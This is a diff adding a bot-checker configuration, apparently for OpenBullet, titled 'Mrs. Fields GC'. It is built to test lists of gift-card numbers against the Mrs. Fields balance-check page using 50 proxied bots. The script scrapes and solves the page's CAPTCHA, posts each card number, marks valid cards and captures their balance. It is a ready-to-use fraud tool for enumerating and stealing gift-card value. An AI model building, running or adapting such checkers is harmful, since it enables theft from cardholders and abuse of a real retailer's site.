@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Mrs. Fields GC",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-03T20:17:29.6591795+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.mrsfields.com/gift-card/balance/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"captcha_id\" value=\"" "\" />" Recursive=FALSE -> VAR "CAPID" "" "" 
+CAPTCHA "https://www.mrsfields.com/images/captcha/<CAPID>.www.mrsfields.com.png" Base64=FALSE SendScreenshot=FALSE -> VAR "CAP" 
+REQUEST POST "https://www.mrsfields.com/gift-card/balance/" AutoRedirect=TRUE 
+  CONTENT "captcha_id=<CAPID>&gc_num=<USER>&captcha=<CAP>&sub=Check+Balance" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Your gift card balance is" 
+  KEYCHAIN Failure OR 
+    KEY "Problems found with the information provided" 
+PARSE "<SOURCE>" LR "<span class=\"balance-val\">" "</span>" Recursive=FALSE -> CAP "Balance" "" "" 
